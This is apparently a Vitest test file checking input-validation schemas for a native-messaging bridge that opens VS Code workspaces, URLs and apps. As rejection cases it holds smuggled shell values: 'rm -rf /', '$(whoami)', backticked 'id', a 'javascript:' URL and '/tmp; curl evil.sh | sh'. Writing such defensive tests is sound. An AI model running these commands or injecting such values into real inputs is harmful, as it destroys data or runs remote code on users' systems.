import { describe, it, expect } from "vitest";
import {
  nativeRequestSchema,
  pathSchema,
  urlSchema,
  isShellSafe,
} from "../src/messages.js";

describe("pathSchema", () => {
  it("accepts absolute paths and paths with spaces", () => {
    expect(pathSchema.safeParse("/Users/me/Projects/My App").success).toBe(true);
    expect(pathSchema.safeParse("~/code/thing.code-workspace").success).toBe(true);
  });

  it("rejects relative paths", () => {
    expect(pathSchema.safeParse("relative/path").success).toBe(false);
  });

  it("rejects path traversal", () => {
    expect(pathSchema.safeParse("/Users/me/../root/secret").success).toBe(false);
  });

  it("rejects shell metacharacters", () => {
    expect(pathSchema.safeParse("/tmp/x; rm -rf /").success).toBe(false);
    expect(pathSchema.safeParse("/tmp/$(whoami)").success).toBe(false);
    expect(pathSchema.safeParse("/tmp/x`id`").success).toBe(false);
  });
});

describe("urlSchema", () => {
  it("accepts http/https/discord schemes", () => {
    expect(urlSchema.safeParse("https://github.com/foo/bar").success).toBe(true);
    expect(urlSchema.safeParse("discord://discord.com/channels/1/2").success).toBe(true);
  });

  it("accepts URLs with encoded characters and spaces", () => {
    expect(urlSchema.safeParse("https://example.com/a%20b?q=hello%20world").success).toBe(true);
  });

  it("rejects malformed URLs and disallowed schemes", () => {
    expect(urlSchema.safeParse("not a url").success).toBe(false);
    expect(urlSchema.safeParse("javascript:alert(1)").success).toBe(false);
    expect(urlSchema.safeParse("chrome://settings").success).toBe(false);
  });
});

describe("nativeRequestSchema", () => {
  it("validates a healthCheck", () => {
    const r = nativeRequestSchema.safeParse({ action: "healthCheck" });
    expect(r.success).toBe(true);
  });

  it("validates a vscode request with a spaced path", () => {
    const r = nativeRequestSchema.safeParse({
      action: "openVscodeWorkspace",
      targetPath: "/Users/me/My Projects/app",
    });
    expect(r.success).toBe(true);
  });

  it("rejects unknown action types", () => {
    const r = nativeRequestSchema.safeParse({ action: "rmrf", path: "/" });
    expect(r.success).toBe(false);
  });

  it("rejects injection attempts in vscode path", () => {
    const r = nativeRequestSchema.safeParse({
      action: "openVscodeWorkspace",
      targetPath: "/tmp; curl evil.sh | sh",
    });
    expect(r.success).toBe(false);
  });

  it("rejects unexpected extra properties on discriminated members via action mismatch", () => {
    const r = nativeRequestSchema.safeParse({
      action: "openApplication",
      applicationName: "Discord`id`",
    });
    expect(r.success).toBe(false);
  });
});

describe("isShellSafe", () => {
  it("flags metacharacters", () => {
    expect(isShellSafe("Discord")).toBe(true);
    expect(isShellSafe("Disc;ord")).toBe(false);
  });
});
